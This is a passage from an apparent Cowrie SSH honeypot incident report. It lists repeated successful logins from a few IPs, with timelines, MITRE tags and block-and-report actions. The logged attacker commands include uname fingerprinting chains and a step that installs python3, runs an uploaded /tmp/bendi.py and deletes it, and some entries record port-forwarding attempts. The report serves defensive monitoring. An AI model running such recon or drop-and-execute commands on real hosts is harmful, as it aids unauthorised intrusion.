| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:57:45` | `cowrie.session.connect` |
| `2026-09-10 19:57:45` | `cowrie.client.version` |
| `2026-09-10 19:57:45` | `cowrie.client.kex` |
| `2026-09-10 19:57:46` | `cowrie.login.success` |
| `2026-09-10 19:57:47` | `cowrie.session.params` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.success` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:47` | `cowrie.command.input` |
| `2026-09-10 19:57:48` | `cowrie.log.closed` |
| `2026-09-10 19:57:49` | `cowrie.session.params` |
| `2026-09-10 19:57:49` | `cowrie.command.input` |
| `2026-09-10 19:57:49` | `cowrie.log.closed` |
| `2026-09-10 19:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4735a2eae130

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-10 19:58 |
| **Last Seen** | 2026-09-10 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:58:58` | `cowrie.session.connect` |
| `2026-09-10 19:58:58` | `cowrie.client.version` |
| `2026-09-10 19:58:58` | `cowrie.client.kex` |
| `2026-09-10 19:58:58` | `cowrie.login.success` |
| `2026-09-10 19:58:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b7493a8708

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-10 19:59 |
| **Last Seen** | 2026-09-10 20:01 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:59:01` | `cowrie.session.connect` |
| `2026-09-10 19:59:02` | `cowrie.client.version` |
| `2026-09-10 19:59:02` | `cowrie.client.kex` |
| `2026-09-10 19:59:02` | `cowrie.login.success` |
| `2026-09-10 19:59:03` | `cowrie.session.file_upload` |
| `2026-09-10 19:59:04` | `cowrie.session.params` |
| `2026-09-10 19:59:04` | `cowrie.command.input` |
| `2026-09-10 19:59:04` | `cowrie.command.input` |
| `2026-09-10 19:59:04` | `cowrie.command.input` |
| `2026-09-10 19:59:04` | `cowrie.command.failed` |
| `2026-09-10 19:59:04` | `cowrie.log.closed` |
| `2026-09-10 19:59:05` | `cowrie.session.params` |
| `2026-09-10 19:59:05` | `cowrie.command.input` |
| `2026-09-10 19:59:05` | `cowrie.log.closed` |
| `2026-09-10 19:59:06` | `cowrie.session.params` |
| `2026-09-10 19:59:06` | `cowrie.command.input` |
| `2026-09-10 19:59:06` | `cowrie.log.closed` |
| `2026-09-10 19:59:06` | `cowrie.session.params` |
| `2026-09-10 19:59:06` | `cowrie.command.input` |
| `2026-09-10 19:59:06` | `cowrie.command.failed` |
| `2026-09-10 19:59:06` | `cowrie.command.failed` |
| `2026-09-10 20:00:07` | `cowrie.session.params` |
| `2026-09-10 20:00:07` | `cowrie.command.input` |
| `2026-09-10 20:01:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-641d49697346

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-10 19:59 |
| **Last Seen** | 2026-09-10 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:59:10` | `cowrie.session.connect` |
| `2026-09-10 19:59:10` | `cowrie.client.version` |
| `2026-09-10 19:59:10` | `cowrie.client.kex` |
| `2026-09-10 19:59:11` | `cowrie.login.success` |
| `2026-09-10 19:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97a6371554ff

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 19:59 |
| **Last Seen** | 2026-09-10 19:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 19:59:38` | `cowrie.session.connect` |
| `2026-09-10 19:59:38` | `cowrie.client.version` |
| `2026-09-10 19:59:38` | `cowrie.client.kex` |
| `2026-09-10 19:59:39` | `cowrie.login.success` |
| `2026-09-10 19:59:40` | `cowrie.session.params` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.success` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.command.input` |
| `2026-09-10 19:59:40` | `cowrie.log.closed` |
| `2026-09-10 19:59:41` | `cowrie.session.params` |
| `2026-09-10 19:59:41` | `cowrie.command.input` |
| `2026-09-10 19:59:42` | `cowrie.log.closed` |
| `2026-09-10 19:59:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c20226efbdf

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-10 20:01 |
| **Last Seen** | 2026-09-10 20:03 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:01:19` | `cowrie.session.connect` |
| `2026-09-10 20:01:19` | `cowrie.client.version` |
| `2026-09-10 20:01:19` | `cowrie.client.kex` |
| `2026-09-10 20:01:19` | `cowrie.login.success` |
| `2026-09-10 20:01:20` | `cowrie.session.file_upload` |
| `2026-09-10 20:01:21` | `cowrie.session.params` |
| `2026-09-10 20:01:21` | `cowrie.command.input` |
| `2026-09-10 20:01:21` | `cowrie.command.input` |
| `2026-09-10 20:01:21` | `cowrie.command.input` |
| `2026-09-10 20:01:21` | `cowrie.command.failed` |
| `2026-09-10 20:01:21` | `cowrie.log.closed` |
| `2026-09-10 20:01:22` | `cowrie.session.params` |
| `2026-09-10 20:01:22` | `cowrie.command.input` |
| `2026-09-10 20:01:22` | `cowrie.log.closed` |
| `2026-09-10 20:01:22` | `cowrie.session.params` |
| `2026-09-10 20:01:22` | `cowrie.command.input` |
| `2026-09-10 20:01:23` | `cowrie.log.closed` |
| `2026-09-10 20:01:23` | `cowrie.session.params` |
| `2026-09-10 20:01:23` | `cowrie.command.input` |
| `2026-09-10 20:01:23` | `cowrie.command.failed` |
| `2026-09-10 20:01:23` | `cowrie.command.failed` |
| `2026-09-10 20:02:24` | `cowrie.session.params` |
| `2026-09-10 20:02:24` | `cowrie.command.input` |
| `2026-09-10 20:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cffc1abf373

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:01 |
| **Last Seen** | 2026-09-10 20:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:01:33` | `cowrie.session.connect` |
| `2026-09-10 20:01:33` | `cowrie.client.version` |
| `2026-09-10 20:01:33` | `cowrie.client.kex` |
| `2026-09-10 20:01:34` | `cowrie.login.success` |
| `2026-09-10 20:01:35` | `cowrie.session.params` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.success` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.command.input` |
| `2026-09-10 20:01:35` | `cowrie.log.closed` |
| `2026-09-10 20:01:37` | `cowrie.session.params` |
| `2026-09-10 20:01:37` | `cowrie.command.input` |
| `2026-09-10 20:01:37` | `cowrie.log.closed` |
| `2026-09-10 20:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ee671c609e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:03 |
| **Last Seen** | 2026-09-10 20:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:03:41` | `cowrie.session.connect` |
| `2026-09-10 20:03:41` | `cowrie.client.version` |
| `2026-09-10 20:03:41` | `cowrie.client.kex` |
| `2026-09-10 20:03:41` | `cowrie.login.success` |
| `2026-09-10 20:03:43` | `cowrie.session.params` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.success` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.command.input` |
| `2026-09-10 20:03:43` | `cowrie.log.closed` |
| `2026-09-10 20:03:44` | `cowrie.session.params` |
| `2026-09-10 20:03:44` | `cowrie.command.input` |
| `2026-09-10 20:03:44` | `cowrie.log.closed` |
| `2026-09-10 20:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cfadd573d09

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:05 |
| **Last Seen** | 2026-09-10 20:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:05:56` | `cowrie.session.connect` |
| `2026-09-10 20:05:56` | `cowrie.client.version` |
| `2026-09-10 20:05:56` | `cowrie.client.kex` |
| `2026-09-10 20:05:57` | `cowrie.login.success` |
| `2026-09-10 20:05:57` | `cowrie.session.params` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.success` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:57` | `cowrie.command.input` |
| `2026-09-10 20:05:58` | `cowrie.log.closed` |
| `2026-09-10 20:05:58` | `cowrie.session.params` |
| `2026-09-10 20:05:58` | `cowrie.command.input` |
| `2026-09-10 20:05:59` | `cowrie.log.closed` |
| `2026-09-10 20:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e359a1a06616

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:08 |
| **Last Seen** | 2026-09-10 20:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:08:24` | `cowrie.session.connect` |
| `2026-09-10 20:08:24` | `cowrie.client.version` |
| `2026-09-10 20:08:24` | `cowrie.client.kex` |
| `2026-09-10 20:08:25` | `cowrie.login.success` |
| `2026-09-10 20:08:25` | `cowrie.session.params` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.success` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:25` | `cowrie.command.input` |
| `2026-09-10 20:08:26` | `cowrie.log.closed` |
| `2026-09-10 20:08:27` | `cowrie.session.params` |
| `2026-09-10 20:08:27` | `cowrie.command.input` |
| `2026-09-10 20:08:27` | `cowrie.log.closed` |
| `2026-09-10 20:08:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-723fcc2d82d2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-10 20:10 |
| **Last Seen** | 2026-09-10 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:10:43` | `cowrie.session.connect` |
| `2026-09-10 20:10:44` | `cowrie.client.version` |
| `2026-09-10 20:10:44` | `cowrie.client.kex` |
| `2026-09-10 20:10:44` | `cowrie.login.success` |
| `2026-09-10 20:10:45` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:10:45` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:10:45` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ecdd16dec1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:11 |
| **Last Seen** | 2026-09-10 20:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:11:15` | `cowrie.session.connect` |
| `2026-09-10 20:11:15` | `cowrie.client.version` |
| `2026-09-10 20:11:15` | `cowrie.client.kex` |
| `2026-09-10 20:11:16` | `cowrie.login.success` |
| `2026-09-10 20:11:17` | `cowrie.session.params` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.success` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.command.input` |
| `2026-09-10 20:11:17` | `cowrie.log.closed` |
| `2026-09-10 20:11:18` | `cowrie.session.params` |
| `2026-09-10 20:11:18` | `cowrie.command.input` |
| `2026-09-10 20:11:18` | `cowrie.log.closed` |
| `2026-09-10 20:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31908e913b52

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-09-10 20:11 |
| **Last Seen** | 2026-09-10 20:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:11:53` | `cowrie.session.connect` |
| `2026-09-10 20:11:54` | `cowrie.client.version` |
| `2026-09-10 20:11:54` | `cowrie.client.kex` |
| `2026-09-10 20:11:55` | `cowrie.login.success` |
| `2026-09-10 20:11:55` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:11:55` | `cowrie.direct-tcpip.data` |
| `2026-09-10 20:11:55` | `cowrie.direct-tcpip.request` |
| `2026-09-10 20:11:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4a05ba0ea3a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:13 |
| **Last Seen** | 2026-09-10 20:13 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-10 20:13:17` | `cowrie.session.connect` |
| `2026-09-10 20:13:17` | `cowrie.client.version` |
| `2026-09-10 20:13:17` | `cowrie.client.kex` |
| `2026-09-10 20:13:18` | `cowrie.login.success` |
| `2026-09-10 20:13:18` | `cowrie.session.params` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.success` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:18` | `cowrie.command.input` |
| `2026-09-10 20:13:19` | `cowrie.log.closed` |
| `2026-09-10 20:13:20` | `cowrie.session.params` |
| `2026-09-10 20:13:20` | `cowrie.command.input` |
| `2026-09-10 20:13:20` | `cowrie.log.closed` |
| `2026-09-10 20:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e922026ca46e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-09-10 20:15 |
